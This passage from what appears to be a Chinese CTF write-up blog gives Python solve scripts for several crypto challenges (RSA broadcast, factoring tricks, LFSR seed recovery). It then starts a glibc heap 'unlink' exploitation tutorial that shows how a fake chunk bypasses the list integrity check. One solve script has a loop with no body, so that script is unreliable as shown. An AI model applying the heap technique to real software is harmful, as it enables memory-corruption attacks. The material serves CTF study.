class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    N,e,d=init_key()</span><br><span class="line">    n_list.append(N)</span><br><span class="line">    c=<span class="built_in">pow</span>(FLAG,e,N)</span><br><span class="line">    c_list.append(<span class="built_in">pow</span>(FLAG,e,N))</span><br><span class="line">    <span class="keyword">assert</span>(<span class="built_in">pow</span>(c,d,N)==FLAG)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n_list:&quot;</span>,n_list)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c_list:&quot;</span>,c_list)</span><br></pre></td></tr></table></figure>
<h3 id="分析-v4"><a class="header-anchor" href="#分析-v4">¶</a>分析</h3>
<p>给了多组N，C 且e=9,直接RSA低加密指数广播攻击</p>
<h3 id="exp-v4"><a class="header-anchor" href="#exp-v4">¶</a>exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy.ntheory.modular <span class="keyword">import</span> crt</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = <span class="number">9</span></span><br><span class="line">N = [<span class="number">71189786319102608575263218254922479901008514616376166401353025325668690465852130559783959409002115897148828732231478529655075366072137059589917001875303598680931962384468363842379833044123189276199264340224973914079447846845897807085694711541719515881377391200011269924562049643835131619086349617062034608799</span>, <span class="number">92503831027754984321994282254005318198418454777812045042619263533423066848097985191386666241913483806726751133691867010696758828674382946375162423033994046273252417389169779506788545647848951018539441971140081528915876529645525880324658212147388232683347292192795975558548712504744297104487514691170935149949</span>, <span class="number">100993952830138414466948640139083231443558390127247779484027818354177479632421980458019929149817002579508423291678953554090956334137167905685261724759487245658147039684536216616744746196651390112540237050493468689520465897258378216693418610879245129435268327315158194612110422630337395790254881602124839071919</span>, <span class="number">59138293747457431012165762343997972673625934330232909935732464725128776212729547237438509546925172847581735769773563840639187946741161318153031173864953372796950422229629824699580131369991913883136821374596762214064774480548532035315344368010507644630655604478651898097886873485265848973185431559958627423847</span>, <span class="number">66827868958054485359731420968595906328820823695638132426084478524423658597714990545142120448668257273436546456116147999073797943388584861050133103137697812149742551913704341990467090049650721713913812069904136198912314243175309387952328961054617877059134151915723594900209641163321839502908705301293546584147</span>, <span class="number">120940513339890268554625391482989102665030083707530690312336379356969219966820079510946652021721814016286307318930536030308296265425674637215009052078834615196224917417698019787514831973471113022781129000531459800329018133248426080717653298100515701379374786486337920294380753805825328119757649844054966712377</span>, <span class="number">72186594495190221129349814154999705524005203343018940547856004977368023856950836974465616291478257156860734574686154136925776069045232149725101769594505766718123155028300703627531567850035682448632166309129911061492630709698934310123778699316856399909549674138453085885820110724923723830686564968967391721281</span>, <span class="number">69105037583161467265649176715175579387938714721653281201847973223975467813529036844308693237404592381480367515044829190066606146105800243199497182114398931410844901178842049915914390117503986044951461783780327749665912369177733246873697481544777183820939967036346862056795919812693669387731294595126647751951</span>, <span class="number">76194219445824867986050004226602973283400885106636660263597964027139613163638212828932901192009131346530898961165310615466747046710743013409318156266326090650584190382130795884514074647833949281109675170830565650006906028402714868781834693473191228256626654011772428115359653448111208831188721505467497494581</span>]</span><br><span class="line">C =  [<span class="number">62580922178008480377006528793506649089253164524883696044759651305970802215270721223149734532870729533611357047595181907404222690394917605617029675103788705320032707977225447998111744887898039756375876685711148857676502670812333076878964148863713993853526715855758799502735753454247721711366497722251078739585</span>, <span class="number">46186240819076690248235492196228128599822002268014359444368898414937734806009161030424589993541799877081745454934484263188270879142125136786221625234555265815513136730416539407710862948861531339065039071959576035606192732936477944770308784472646015244527805057990939765708793705044236665364664490419874206900</span>, <span class="number">85756449024868529058704599481168414715291172247059370174556127800630896693021701121075838517372920466708826412897794900729896389468152213884232173410022054605870785910461728567377769960823103334874807744107855490558726013068890632637193410610478514663078901021307258078678427928255699031215654693270240640198</span>, <span class="number">14388767329946097216670270960679686032536707277732968784379505904021622612991917314721678940833050736745004078559116326396233622519356703639737886289595860359630019239654690312132039876082685046329079266785042428947147658321799501605837784127004536996628492065409017175037161261039765340032473048737319069656</span>, <span class="number">1143736792108232890306863524988028098730927600066491485326214420279375304665896453544100447027809433141790331191324806205845009336228331138326163746853197990596700523328423791764843694671580875538251166864957646807184041817863314204516355683663859246677105132100377322669627893863885482167305919925159944839</span>, <span class="number">2978800921927631161807562509445310353414810029862911925227583943849942080514132963605492727604495513988707849133045851539412276254555228149742924149242124724864770049898278052042163392380895275970574317984638058768854065506927848951716677514095183559625442889028813635385408810698294574175092159389388091981</span>, <span class="number">16200944263352278316040095503540249310705602580329203494665614035841657418101517016718103326928336623132935178377208651067093136976383774189554806135146237406248538919915426183225265103769259990252162411307338473817114996409705345401251435268136647166395894099897737607312110866874944619080871831772376466376</span>, <span class="number">31551601425575677138046998360378916515711528548963089502535903329268089950335615563205720969393649713416910860593823506545030969355111753902391336139384464585775439245735448030993755229554555004154084649002801255396359097917380427525820249562148313977941413268787799534165652742114031759562268691233834820996</span>, <span class="number">25288164985739570635307839193110091356864302148147148153228604718807817833935053919412276187989509493755136905193728864674684139319708358686431424793278248263545370628718355096523088238513079652226028236137381367215156975121794485995030822902933639803569133458328681148758392333073624280222354763268512333515</span>]</span><br><span class="line"></span><br><span class="line">resultant, mod = crt(N,C)</span><br><span class="line">value, is_perfect = iroot(resultant,e)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(value))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="RoarCTF-2019-RSA"><a class="header-anchor" href="#RoarCTF-2019-RSA">¶</a>[RoarCTF 2019]RSA</h2>
<h3 id="题目-v7"><a class="header-anchor" href="#题目-v7">¶</a>题目</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">A=(((y%x)**<span class="number">5</span>)%(x%y))**<span class="number">2019</span>+y**<span class="number">316</span>+(y+<span class="number">1</span>)/x</span><br><span class="line">p=next_prime(z*x*y)</span><br><span class="line">q=next_prime(z)</span><br><span class="line">A =  <span class="number">2683349182678714524247469512793476009861014781004924905484127480308161377768192868061561886577048646432382128960881487463427414176114486885830693959404989743229103516924432512724195654425703453612710310587164417035878308390676612592848750287387318129424195208623440294647817367740878211949147526287091298307480502897462279102572556822231669438279317474828479089719046386411971105448723910594710418093977044179949800373224354729179833393219827789389078869290217569511230868967647963089430594258815146362187250855166897553056073744582946148472068334167445499314471518357535261186318756327890016183228412253724</span></span><br><span class="line">n =  <span class="number">117930806043507374325982291823027285148807239117987369609583515353889814856088099671454394340816761242974462268435911765045576377767711593100416932019831889059333166946263184861287975722954992219766493089630810876984781113645362450398009234556085330943125568377741065242183073882558834603430862598066786475299918395341014877416901185392905676043795425126968745185649565106322336954427505104906770493155723995382318346714944184577894150229037758434597242564815299174950147754426950251419204917376517360505024549691723683358170823416757973059354784142601436519500811159036795034676360028928301979780528294114933347127</span></span><br><span class="line">c =  <span class="number">41971850275428383625653350824107291609587853887037624239544762751558838294718672159979929266922528917912189124713273673948051464226519605803745171340724343705832198554680196798623263806617998072496026019940476324971696928551159371970207365741517064295956376809297272541800647747885170905737868568000101029143923792003486793278197051326716680212726111099439262589341050943913401067673851885114314709706016622157285023272496793595281054074260451116213815934843317894898883215362289599366101018081513215120728297131352439066930452281829446586562062242527329672575620261776042653626411730955819001674118193293313612128</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="分析-v5"><a class="header-anchor" href="#分析-v5">¶</a>分析</h3>
<p>$A=(((y % x)^5)%(x % y))<sup>{2019}+y</sup>{316}+(y+1)/x$</p>
<p>已知A的值可以爆破出 x,y</p>
<p>又已知<br>
$p\approx x * y * z$<br>
$q \approx z$<br>
所以可得<br>
$q^2 \approx \frac{n}{x*y}\qquad$</p>
<p>得到p,q 后 就可以爆破e来得到flag</p>
<h3 id="exp-v5"><a class="header-anchor" href="#exp-v5">¶</a>exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span>  gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#A=(((y%x)**5)%(x%y))**2019+y**316+(y+1)/x</span></span><br><span class="line"><span class="comment">#p=next_prime(z*x*y)</span></span><br><span class="line"><span class="comment">#q=next_prime(z)</span></span><br><span class="line"></span><br><span class="line">A =  <span class="number">2683349182678714524247469512793476009861014781004924905484127480308161377768192868061561886577048646432382128960881487463427414176114486885830693959404989743229103516924432512724195654425703453612710310587164417035878308390676612592848750287387318129424195208623440294647817367740878211949147526287091298307480502897462279102572556822231669438279317474828479089719046386411971105448723910594710418093977044179949800373224354729179833393219827789389078869290217569511230868967647963089430594258815146362187250855166897553056073744582946148472068334167445499314471518357535261186318756327890016183228412253724</span></span><br><span class="line">n =  <span class="number">117930806043507374325982291823027285148807239117987369609583515353889814856088099671454394340816761242974462268435911765045576377767711593100416932019831889059333166946263184861287975722954992219766493089630810876984781113645362450398009234556085330943125568377741065242183073882558834603430862598066786475299918395341014877416901185392905676043795425126968745185649565106322336954427505104906770493155723995382318346714944184577894150229037758434597242564815299174950147754426950251419204917376517360505024549691723683358170823416757973059354784142601436519500811159036795034676360028928301979780528294114933347127</span></span><br><span class="line">c =  <span class="number">41971850275428383625653350824107291609587853887037624239544762751558838294718672159979929266922528917912189124713273673948051464226519605803745171340724343705832198554680196798623263806617998072496026019940476324971696928551159371970207365741517064295956376809297272541800647747885170905737868568000101029143923792003486793278197051326716680212726111099439262589341050943913401067673851885114314709706016622157285023272496793595281054074260451116213815934843317894898883215362289599366101018081513215120728297131352439066930452281829446586562062242527329672575620261776042653626411730955819001674118193293313612128</span></span><br><span class="line">f = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">   <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">       C=(y+<span class="number">1</span>)//x</span><br><span class="line">       D=x%y</span><br><span class="line">       <span class="keyword">if</span>(D!=<span class="number">0</span>):</span><br><span class="line">           f=(((y%x)**<span class="number">5</span>)%D)**<span class="number">2019</span>+y**<span class="number">316</span>+C</span><br><span class="line">       <span class="keyword">if</span>(f==A):</span><br><span class="line">           <span class="built_in">print</span>(x,y)</span><br><span class="line">           <span class="keyword">break</span></span><br><span class="line"><span class="comment">#x = 2</span></span><br><span class="line"><span class="comment">#y = 83</span></span><br><span class="line"></span><br><span class="line">n1 = n//<span class="number">166</span></span><br><span class="line">n1 = next_prime(n1)</span><br><span class="line"></span><br><span class="line">q1 = iroot(n1,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">q = next_prime(q1)</span><br><span class="line">p = n // q</span><br><span class="line"><span class="built_in">print</span>(isPrime(p))</span><br><span class="line"></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x100000</span>):</span><br><span class="line">    e = i</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        d = invert(e,phi)</span><br><span class="line">        flag = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">        flag = long_to_bytes(flag)</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;CTF&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<h2 id="CISCN-2018-oldstreamgame"><a class="header-anchor" href="#CISCN-2018-oldstreamgame">¶</a>[CISCN 2018]oldstreamgame</h2>
<h3 id="考点"><a class="header-anchor" href="#考点">¶</a>考点</h3>
<pre><code>lfsr求初始化seed
</code></pre>
<h3 id="题目-v8"><a class="header-anchor" href="#题目-v8">¶</a>题目</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">&quot;flag&#123;&quot;</span>)</span><br><span class="line"><span class="keyword">assert</span> flag.endswith(<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag)==<span class="number">14</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lfsr</span>(<span class="params">R,mask</span>):</span></span><br><span class="line">    output = (R &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    i=(R&amp;mask)&amp;<span class="number">0xffffffff</span></span><br><span class="line">    lastbit=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i!=<span class="number">0</span>:</span><br><span class="line">        lastbit^=(i&amp;<span class="number">1</span>)</span><br><span class="line">        i=i&gt;&gt;<span class="number">1</span></span><br><span class="line">    output^=lastbit</span><br><span class="line">    <span class="keyword">return</span> (output,lastbit)</span><br><span class="line"></span><br><span class="line">R=<span class="built_in">int</span>(flag[<span class="number">5</span>:-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">mask = <span class="number">0b10100100000010000000100010010100</span></span><br><span class="line"></span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;w&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    tmp=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        (R,out)=lfsr(R,mask)</span><br><span class="line">        tmp=(tmp &lt;&lt; <span class="number">1</span>)^out</span><br><span class="line">    f.write(<span class="built_in">chr</span>(tmp))</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
<h3 id="exp-v6"><a class="header-anchor" href="#exp-v6">¶</a>exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#mask=0b10100100000010000000100010010100 #0,2,5,12,20,24,27,29</span></span><br><span class="line">c = <span class="string">&#x27;00100000111111011110111011111000&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span>(<span class="params">c</span>):</span></span><br><span class="line">    li=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        temp=<span class="string">&#x27;1&#x27;</span>+<span class="string">&#x27;&#x27;</span>.join(li)+c[:<span class="number">31</span>-<span class="built_in">len</span>(li)]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(temp[<span class="number">0</span>])^<span class="built_in">int</span>(temp[<span class="number">2</span>])^<span class="built_in">int</span>(temp[<span class="number">5</span>])^<span class="built_in">int</span>(temp[<span class="number">12</span>])^<span class="built_in">int</span>(temp[<span class="number">20</span>])^<span class="built_in">int</span>(temp[<span class="number">24</span>])^<span class="built_in">int</span>(temp[<span class="number">27</span>])^<span class="built_in">int</span>(temp[<span class="number">29</span>])==<span class="built_in">int</span>(c[<span class="number">31</span>-<span class="built_in">len</span>(li)]):</span><br><span class="line">         </span><br><span class="line">            li.insert(<span class="number">0</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            </span><br><span class="line">            li.insert(<span class="number">0</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> li</span><br><span class="line">flag=solve(c)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">eval</span>(<span class="string">&#x27;0b&#x27;</span>+<span class="string">&#x27;&#x27;</span>.join(flag))))</span><br></pre></td></tr></table></figure>
<h2 id="长安杯-2021-checkin"><a class="header-anchor" href="#长安杯-2021-checkin">¶</a>[长安杯 2021]checkin</h2>
<h3 id="题目考点"><a class="header-anchor" href="#题目考点">¶</a>题目考点</h3>
<pre><code>1.RSA
2.威尔逊定理
</code></pre>
<h3 id="题目-v9"><a class="header-anchor" href="#题目-v9">¶</a>题目</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">16</span>)</span><br><span class="line">n = p*q</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,p-q):</span><br><span class="line">    m = m*i%n</span><br><span class="line">e = <span class="number">1049</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">pow</span>(<span class="number">2</span>,e,n))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">pow</span>(m,e,n))</span><br><span class="line"><span class="comment">#4513855932190587780512692251070948513905472536079140708186519998265613363916408288602023081671609336332823271976169443708346965729874135535872958782973382975364993581165018591335971709648749814573285241290480406050308656233944927823668976933579733318618949138978777831374262042028072274386196484449175052332019377</span></span><br><span class="line"><span class="comment">#3303523331971096467930886326777599963627226774247658707743111351666869650815726173155008595010291772118253071226982001526457616278548388482820628617705073304972902604395335278436888382882457685710065067829657299760804647364231959804889954665450340608878490911738748836150745677968305248021749608323124958372559270</span></span><br></pre></td></tr></table></figure>
<h3 id="题目分析"><a class="header-anchor" href="#题目分析">¶</a>题目分析</h3>
<p>可以用$2^e-c1$得到kn,然后分一直q为16位的质数爆破得到q,最后分解kp得到p</p>
<p>利用威尔逊定理求得(p-q-1)的阶乘后计算出m</p>
<h3 id="exp-v7"><a class="header-anchor" href="#exp-v7">¶</a>exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span>  Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c1 = <span class="number">4513855932190587780512692251070948513905472536079140708186519998265613363916408288602023081671609336332823271976169443708346965729874135535872958782973382975364993581165018591335971709648749814573285241290480406050308656233944927823668976933579733318618949138978777831374262042028072274386196484449175052332019377</span></span><br><span class="line">c2 = <span class="number">3303523331971096467930886326777599963627226774247658707743111351666869650815726173155008595010291772118253071226982001526457616278548388482820628617705073304972902604395335278436888382882457685710065067829657299760804647364231959804889954665450340608878490911738748836150745677968305248021749608323124958372559270</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">1049</span></span><br><span class="line">kn = <span class="number">2</span>**e - c1</span><br><span class="line">q = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**<span class="number">15</span>,<span class="number">2</span>**<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">if</span> kn % i == <span class="number">0</span> <span class="keyword">and</span> isPrime(i):</span><br><span class="line"></span><br><span class="line">kp = kn // q</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">yaf</span>(<span class="params">kp</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="number">1000</span>):</span><br><span class="line">        <span class="keyword">if</span> kp % i == <span class="number">0</span>:</span><br><span class="line">            p = kp // i</span><br><span class="line">            <span class="keyword">if</span> isPrime(p):</span><br><span class="line">                <span class="keyword">return</span> p</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span>  yaf(p)</span><br><span class="line"></span><br><span class="line">p = yaf(kp)</span><br><span class="line">n = p*q</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wision</span>(<span class="params">p,q</span>):</span></span><br><span class="line">    t=-<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(p-q,p):</span><br><span class="line">        t=t*invert(i,p) %p</span><br><span class="line">    <span class="keyword">return</span> t</span><br><span class="line">k=wision(p,q)</span><br><span class="line">d=invert(e,p-<span class="number">1</span>)</span><br><span class="line">c=c2*invert(<span class="built_in">pow</span>(k,e,n),n)%p</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c,d,p)))</span><br></pre></td></tr></table></figure>
<h2 id="crypto6"><a class="header-anchor" href="#crypto6">¶</a>crypto6</h2>
<h3 id="题目-v10"><a class="header-anchor" href="#题目-v10">¶</a>题目</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">var=<span class="string">&quot;************************************&quot;</span></span><br><span class="line">flag=<span class="string">&#x27;NSSCTF&#123;&#x27;</span> + base64.b16encode(base64.b32encode(base64.b64encode(var.encode()))) + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line">小明不小心泄露了源码，输出结果为：4A5A4C564B36434E4B5241544B5432454E4E32465552324E47424758534D44594C4657564336534D4B5241584F574C4B4B463245365643424F35485649534C584A5A56454B4D4B5049354E47593D3D3D，你能还原出var的正确结果吗？</span><br></pre></td></tr></table></figure>
<h3 id="exp-v8"><a class="header-anchor" href="#exp-v8">¶</a>exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">s = <span class="string">&#x27;4A5A4C564B36434E4B5241544B5432454E4E32465552324E47424758534D44594C4657564336534D4B5241584F574C4B4B463245365643424F35485649534C584A5A56454B4D4B5049354E47593D3D3D&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">b&#x27;NSSCTF&#123;&#x27;</span>+base64.b64decode(base64.b32decode(base64.b16decode(s)))+<span class="string">b&#x27;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h2 id="crypto7"><a class="header-anchor" href="#crypto7">¶</a>crypto7</h2>
<h3 id="题目-v11"><a class="header-anchor" href="#题目-v11">¶</a>题目</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">69f7906323b4f7d1e4e972acf4abfbfc,得到的结果用NSSCTF&#123;&#125;包裹。</span><br></pre></td></tr></table></figure>
<h3 id="题解-v3"><a class="header-anchor" href="#题解-v3">¶</a>题解</h3>
<p>CMD5直接解 <a href="https://cmd5.com/">https://cmd5.com/</a><br>
<img src="http://static.zybuluo.com/hgggg/yo17lzfvcodj3kbhkvtvabni/image_1fk1l4tnednu16q81fjv1fq918hj9.png" alt="image_1fk1l4tnednu16q81fjv1fq918hj9.png-19.1kB"></p>
<h2 id="crypto8"><a class="header-anchor" href="#crypto8">¶</a>crypto8</h2>
<h3 id="题目-v12"><a class="header-anchor" href="#题目-v12">¶</a>题目</h3>
<pre><code>73E-30U1&amp;&gt;V-H965S95]I&lt;U]P;W=E&lt;GT`
</code></pre>
<h3 id="题解-v4"><a class="header-anchor" href="#题解-v4">¶</a>题解</h3>
<p>uuencode<br>
<a href="http://www.hiencode.com/uu.html">http://www.hiencode.com/uu.html</a><br>
<img src="http://static.zybuluo.com/hgggg/3pralsmx3kcjbll0l8p85x8g/image_1fk1qb8i9104idn31in81t9m17rjm.png" alt="image_1fk1qb8i9104idn31in81t9m17rjm.png-34.2kB"></p>
]]></content>
      <categories>
        <category>crypto</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>Unlink</title>
    <url>/2021/10/04/Unlink/</url>
    <content><![CDATA[<p><img src="https://gitee.com/Nss-harukii/images/raw/master/41.jpg" alt="pic"></p>
<span id="more"></span>
<h2 id="原理介绍"><a class="header-anchor" href="#原理介绍">¶</a>原理介绍</h2>
<h3 id="unlink"><a class="header-anchor" href="#unlink">¶</a>unlink</h3>
<p>unlink其实进行脱链操作，下面贴一张CTF-wiki上的原理图</p>
<p><img src="http://static.zybuluo.com/hgggg/sbd9qfl3g1fi9ty3umi38vot/38.png" alt="38.png-123.8kB"></p>
<p>一般来说就是将链表头处处于free状态的堆块从unsorted bin中脱离出来，<br>
然后和物理相邻的堆块合并成新的大堆块（向前合并/向后合并），最后再放入到<br>
unsortedbin中</p>
<h3 id="unlink-源码阅读"><a class="header-anchor" href="#unlink-源码阅读">¶</a>unlink 源码阅读</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* at malloc.c _int_free */</span></span><br><span class="line">  <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize = p-&gt;prev_size;</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">    unlink(av, p, bck, fwd);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>在free当前堆块的是后，会先检查其物理相邻的前一个堆块是不是处于释放状态，如果处于free状态则进入判断</p>
<p>将首先会提取当前堆块的前一个堆块的大小</p>
<p>将当前堆块的size和前一个堆块的size相加，即合并</p>
<p>将当前堆块的指针指向前一个堆块</p>
<p>然后unlink，即将当前的P所指向的chunk从双链表中移除</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span></span><br><span class="line"><span class="meta">    FD = P-&gt;fd;								      \</span></span><br><span class="line"><span class="meta">    BK = P-&gt;bk;								      \</span></span><br><span class="line"><span class="meta">    <span class="meta-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))		      \</span></span><br><span class="line"><span class="meta">      malloc_printerr (check_action, <span class="meta-string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span></span><br><span class="line"><span class="meta">    <span class="meta-keyword">else</span> &#123;								      \</span></span><br><span class="line"><span class="meta">        FD-&gt;bk = BK;							      \</span></span><br><span class="line"><span class="meta">        BK-&gt;fd = FD;							      \</span></span><br><span class="line"><span class="meta">        <span class="meta-keyword">if</span> (!in_smallbin_range (P-&gt;size)				      \</span></span><br><span class="line"><span class="meta">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123;		      \</span></span><br><span class="line"><span class="meta">	    <span class="meta-keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)	      \</span></span><br><span class="line"><span class="meta">		|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \</span></span><br><span class="line"><span class="meta">	      malloc_printerr (check_action,				      \</span></span><br><span class="line"><span class="meta">			       <span class="meta-string">&quot;corrupted double-linked list (not small)&quot;</span>,    \</span></span><br><span class="line"><span class="meta">			       P, AV);					      \</span></span><br><span class="line"><span class="meta">            <span class="meta-keyword">if</span> (FD-&gt;fd_nextsize == NULL) &#123;				      \</span></span><br><span class="line"><span class="meta">                <span class="meta-keyword">if</span> (P-&gt;fd_nextsize == P)				      \</span></span><br><span class="line"><span class="meta">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;		      \</span></span><br><span class="line"><span class="meta">                <span class="meta-keyword">else</span> &#123;							      \</span></span><br><span class="line"><span class="meta">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;			      \</span></span><br><span class="line"><span class="meta">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;			      \</span></span><br><span class="line"><span class="meta">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;			      \</span></span><br><span class="line"><span class="meta">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;			      \</span></span><br><span class="line"><span class="meta">                  &#125;							      \</span></span><br><span class="line"><span class="meta">              &#125; <span class="meta-keyword">else</span> &#123;							      \</span></span><br><span class="line"><span class="meta">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;		      \</span></span><br><span class="line"><span class="meta">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;		      \</span></span><br><span class="line"><span class="meta">              &#125;								      \</span></span><br><span class="line"><span class="meta">          &#125;								      \</span></span><br><span class="line"><span class="meta">      &#125;									      \</span></span><br><span class="line"><span class="meta">&#125;</span></span><br></pre></td></tr></table></figure>
<p>可以看到这里会进行一个检查，判断FD的bk和BK的fd是否指向当前堆块</p>
<h3 id="Unlink-的绕过和利用"><a class="header-anchor" href="#Unlink-的绕过和利用">¶</a>Unlink 的绕过和利用</h3>
<p>step1:伪造fake chunk</p>
<pre><code>chunk = 0x0602040
P 为我们将要合并的地址,P存在于chunk中，且有*(chunk)=P
P-&gt;fd = chunk - 0x18 = 0x602028
P-&gt;bk = chunk - 0x10 = 0x602030
</code></pre>
<p>Step2: 绕过检查</p>
<pre><code>Unlink(P,BK,FD)&#123;
    FD = P-&gt;fd     // FD = 0x602028
    BK = P-&gt;bk     // BK = 0x602030
    if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))&#123;
     // 检查绕过 FD-&gt;bk = *(0x602028+0x18) = *(0x602040)
     //绕过2 Bk-&gt;fd = *(0x602030+0x10) = *(0x602040)  
     FD-&gt;bk = BK //*(0x602040) = 0x602030
     BK-&gt;fd = FD   //*(0x6020240) = 0x602028
    &#125;
&#125;
</code></pre>
<p>Step3: 劫持程序执行流</p>
